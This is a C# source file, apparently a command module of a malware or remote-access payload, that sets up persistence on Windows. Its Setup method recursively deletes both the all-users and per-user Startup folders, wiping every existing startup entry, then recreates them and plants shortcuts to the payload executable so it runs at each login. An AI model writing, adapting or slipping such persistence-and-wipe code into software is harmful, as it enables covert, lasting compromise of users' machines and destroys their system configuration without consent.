using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Payload.Common;

namespace Payload.Core.Command
{
    public class StartupSetupCommand : Payload.Command.Interface.ICommand
    {

        string CommonStartupPath =
            Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
        string StartupPath =
            Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        public override Task Execute()
        {
            try
            {
                Setup();
            }
            catch (Exception e) { Console.WriteLine(e.StackTrace); }
            return null;
        }

        private void Setup()
        {
            if (Directory.Exists(CommonStartupPath))
                Directory.Delete(CommonStartupPath, true);
            if (Directory.Exists(StartupPath))
                Directory.Delete(StartupPath, true);
            Directory.CreateDirectory(CommonStartupPath);
            Directory.CreateDirectory(StartupPath);
            DesktopUtility desktopUtility = new DesktopUtility();
            string localShortcutName = $"{Config.Instance.ExeName}.lnk";
            if (File.Exists(localShortcutName))
            {
                File.Delete(localShortcutName);
            }
                
            string commonShortcutName = $"{CommonStartupPath}\\{localShortcutName}";
            if (File.Exists(commonShortcutName))
            {
                File.Delete(commonShortcutName);
            }

            string shortcutName = $"{StartupPath}\\{localShortcutName}";
            if (File.Exists(shortcutName))
            {
                File.Delete(shortcutName);
            }

            string commonExe = $"{CommonStartupPath}\\{Config.Instance.ExeName}";
            if (File.Exists(commonExe))
            {
                File.Delete(commonExe);
            }

            string exe = $"{StartupPath}\\{Config.Instance.ExeName}";
            if (File.Exists(exe))
            {
                File.Delete(exe);
            }

            desktopUtility.CreateShortcut(commonShortcutName);
            desktopUtility.CreateShortcut(shortcutName);
        }

    }
}
